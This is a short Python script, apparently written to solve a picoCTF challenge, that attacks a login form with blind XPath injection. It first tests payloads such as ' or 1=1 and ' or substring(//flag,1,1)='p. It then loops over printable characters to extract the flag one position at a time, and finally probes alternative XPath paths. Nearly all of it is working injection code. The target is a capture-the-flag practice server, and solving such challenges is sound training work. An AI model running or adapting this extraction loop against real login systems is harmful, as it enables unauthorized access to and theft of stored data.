import requests
base = 'http://wily-courier.picoctf.net:49463'

def try_pass(p):
    r = requests.post(base, data={'name': 'admin', 'pass': p})
    return 'alert-success' in r.text or 'right path' in r.text

# First verify: does ' or 1=2 fail?
print(f"' or 1=2: {try_pass(\"' or 1=2\")}")
print(f"' or 1=1: {try_pass(\"' or 1=1\")}")
print(f"no injection (empty pass): {try_pass('')}")
print(f"' or substring(//flag,1,1)='p: {try_pass(\"' or substring(//flag,1,1)='p\")}")

# Find flag by blind extraction
import string
print('\nExtracting flag...')
flag = ''
charset = string.printable.strip()
pos = 1
while True:
    found = False
    for c in charset:
        # Escape single quote in c
        escaped = c.replace("'", "&apos;")
        payload = f"' or substring(//flag,{pos},1)='{escaped}"
        if try_pass(payload):
            flag += c
            print(f'Position {pos}: {c!r} => flag so far: {flag}')
            found = True
            break
    if not found or '}' in flag:
        if flag:
            print(f'Flag: {flag}')
        break
    pos += 1
    if pos > 100:
        break

if flag:
    print(f'Final flag: {flag}')
else:
    print('No flag found (maybe wrong extraction method)')
    # Try alternative: check if flag is in attribute or different path
    for path in ['//flag', '//secret', '//*/flag', '//flag/@value', '//flag/text()', '//config/flag', '//data/flag']:
        test = f"' or boolean({path}) or '1'='2"
        # Use boolean check where we don't add or '1'='1 but close with false
        # Actually just use the or 1=2 approach
        test = f"' or boolean({path})"
        print(f'Testing {path}: {try_pass(test)}')